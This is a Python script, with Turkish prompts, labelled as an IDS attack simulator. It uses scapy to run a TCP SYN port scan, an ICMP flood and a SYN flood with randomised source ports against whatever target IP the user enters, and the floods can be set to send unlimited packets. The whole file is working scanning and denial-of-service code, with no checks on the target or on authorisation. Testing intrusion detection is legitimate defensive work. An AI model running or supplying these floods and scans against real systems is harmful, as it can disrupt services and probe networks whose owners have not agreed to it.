# -*- coding: utf-8 -*-
"""
IDS TEST TOOL - SALDIRI SİMÜLATÖRÜ (PAKET SAYISI DESTEKLİ)
"""
import sys
import threading
import time

try:
    from scapy.all import IP, TCP, ICMP, send, RandShort
except ImportError:
    print("❌ Scapy bulunamadı! 'pip install scapy' yazarak yükleyin.")
    sys.exit()

def safe_send(pkt):
    try:
        send(pkt, verbose=False)
    except:
        pass

def port_scan(target_ip):
    try:
        start_port = int(input("➤ Başlangıç Portu: "))
        end_port = int(input("➤ Bitiş Portu: "))
        print(f"🚀 {target_ip} üzerinde Tarama başlatıldı...")
        
        for port in range(start_port, end_port + 1):
            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
            safe_send(pkt)
            time.sleep(0.01)
        print("✅ Tarama tamamlandı.")
    except ValueError:
        print("❌ Hatalı giriş!")

def icmp_flood(target_ip):
    try:
        packet_limit = int(input("➤ Gönderilecek Paket Sayısı (Sınırsız için 0): "))
        print(f"🔥 ICMP Flood başlatıldı... (Durdurmak için CTRL+C)")
        
        count = 0
        while True:
            pkt = IP(dst=target_ip) / ICMP()
            safe_send(pkt)
            count += 1
            if packet_limit != 0 and count >= packet_limit:
                break
        print(f"✅ {count} paket gönderildi ve durduruldu.")
    except KeyboardInterrupt:
        print("\n🛑 İşlem kullanıcı tarafından durduruldu.")
    except ValueError:
        print("❌ Lütfen sayı girin!")

def syn_flood(target_ip):
    try:
        port = int(input("➤ Hedef Port: "))
        packet_limit = int(input("➤ Gönderilecek Paket Sayısı (Sınırsız için 0): "))
        print(f"🌊 SYN Flood başlatıldı...")
        
        count = 0
        while True:
            # IDS'in her paketi farklı algılaması için rastgele kaynak portu
            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=port, flags="S")
            safe_send(pkt)
            count += 1
            if packet_limit != 0 and count >= packet_limit:
                break
        print(f"✅ {count} paket gönderildi.")
    except KeyboardInterrupt:
        print("\n🛑 Durduruldu.")
    except ValueError:
        print("❌ Hatalı giriş!")

def menu():
    print(f"\n{'='*35}")
    print("    IDS SALDIRI TEST SİMÜLATÖRÜ")
    print(f"{'='*35}")
    
    target_ip = input("🎯 Hedef IP: ")
    
    while True:
        print(f"\n[ Mevcut Hedef: {target_ip} ]")
        print("1- Port Tarama")
        print("2- ICMP Flood")
        print("3- SYN Flood")
        print("4- Hedef Değiştir")
        print("0- Çıkış")
        
        secim = input("\n➤ Seçiminiz: ")
        
        if secim == "1":
            port_scan(target_ip)
        elif secim == "2":
            icmp_flood(target_ip)
        elif secim == "3":
            syn_flood(target_ip)
        elif secim == "4":
            target_ip = input("🎯 Yeni Hedef IP: ")
        elif secim == "0":
            break
        else:
            print("❌ Geçersiz seçim!")

if __name__ == "__main__":
    menu()